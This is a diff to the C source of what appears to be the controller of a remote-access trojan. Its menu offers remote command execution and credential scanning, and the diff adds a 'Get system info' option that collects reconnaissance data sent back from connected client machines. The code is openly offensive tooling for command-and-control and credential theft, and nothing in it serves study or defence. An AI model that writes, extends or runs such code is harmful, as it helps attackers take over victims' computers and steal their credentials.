@@ -10,7 +10,7 @@
 #define PORT 8080
 #define MAXLINE 1024
 
-char options[]="Choose an option:\n 1. Execute commands\n 2. Scan for credentials\n";
+char options[]="Choose an option:\n 1. Execute commands\n 2. Scan for credentials\n 3. Get system info\n";
 
 void exec_on_client(int clientfd)
 {   
@@ -41,7 +41,6 @@ void get_credentials(int clientfd)
 
     write(STDOUT_FILENO,info_creds,recv_len);
 }
-
 int main()
 {
     int sockfd;
@@ -109,6 +108,41 @@ int main()
             write(connfd,"2",1);
             get_credentials(connfd);
             break;
+            case '3':
+            write(connfd, "3", 1);
+            {
+                char sys_info[MAXLINE * 10] = "";
+                char buffer[MAXLINE]; 
+                int total_bytes_read = 0;
+                int bytes_read;
+
+                while ((bytes_read = read(connfd, buffer, sizeof(buffer) - 1)) > 0) 
+                {
+                    buffer[bytes_read] = '\0'; 
+                    char *end_marker = strstr(buffer, "<END_OF_DATA>");
+                    if (end_marker != NULL) 
+                    {
+                        *end_marker = '\0';
+                        strcat(sys_info, buffer);
+                        printf("System Information from client:\n%s\n", sys_info);
+                        break; 
+                    }   
+                    strcat(sys_info, buffer);
+                    total_bytes_read += bytes_read;
+                    if (total_bytes_read >= sizeof(sys_info) - 1) 
+                    {
+                        printf("Buffer limit reached, cannot read further data.\n");
+                        break;
+                    }
+                 }
+
+                if (total_bytes_read == 0) 
+                {
+                    printf("Failed to receive system information from client or connection closed.\n");
+                }
+            }
+            break;
+            
             default:
             break;
 
